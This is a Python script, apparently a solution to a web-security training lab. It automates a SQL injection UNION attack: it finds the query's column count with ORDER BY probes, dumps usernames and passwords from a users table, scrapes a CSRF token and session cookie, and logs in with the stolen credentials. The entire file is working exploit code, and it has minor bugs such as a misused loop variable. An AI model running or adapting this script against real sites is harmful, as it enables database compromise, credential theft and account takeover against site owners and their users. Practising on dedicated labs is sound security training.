import requests
import sys
from bs4 import BeautifulSoup

def supportString(index, cols, URL):
    nulls = (cols * "null,").split(',')
    print(f"[-] Determining if column {index + 1} supports string...")
    nulls[index] = "'dummy'"
    payload = ",".join(nulls)[:-1]

    response = requests.get(URL + "'+UNION+SELECT+"+ payload +"+--+-+")
    if response.status_code == 200:
        print(f"[+] Column {i + 1} supports string...")
        return index
    else:
        print(f"[-] Column {i + 1} does not support string...")

def findCols(URL):
    i = 1
    cols = 0
    while True:
        response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
        if response.status_code != 200:
            cols = i - 1
            print(f"[+] No. of columns : {(i -1)}")
            break
        i += 1
    return cols

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

print("[-] Determining number of columns...")
cols = findCols(URL)

string_indices = []
for i in range(cols):
    tmp = supportString(i, cols, URL)
    if str(tmp).isdigit():
        string_indices.append(tmp)
print(f"[+] {len(string_indices)} column(s) support string in total...")

print("[-] Performing UNION attack to get creds...")
response = requests.get(URL + "'+UNION+SELECT+null,CONCAT(username, '~', password)+FROM+users+--+-+")
soup = BeautifulSoup(response.content, "html5lib")
results = soup.find_all('th')
users = []
pwds = []
for result in results:
    if '~' in result.get_text():
        users.append(result.get_text().split('~')[0])
        pwds.append(result.get_text().split('~')[1])
print("[+} Users : ")
for user in users:
    print(f"\t {user}")
print("[+] Passwords")
for pwd in pwds:
    print(f"\t {pwd}")

print("[-] Trying to log as administrator...")
response = requests.get(URL.replace("/filter?category=Pets", "/login"))
soup = BeautifulSoup(response.content, "html5lib")
csrf = str(soup.find_all('input')[0]).split(" ")[4].replace('value="', '').replace('"/>', "")
print(f"[+] CSRF token : {csrf}")
sess_cookie = response.cookies["session"]
print(f"[+] Session cookie : {sess_cookie}")

response = requests.post(URL.replace("/filter?category=Pets", "/login"), data={"csrf":csrf, "username":users[0], "password":pwds[0]}, headers={"Cookie":"session="+sess_cookie})

if response.status_code == 200:
    print("[+] Lab solved successfully !!")
else:
    print("[-] Try harder...")

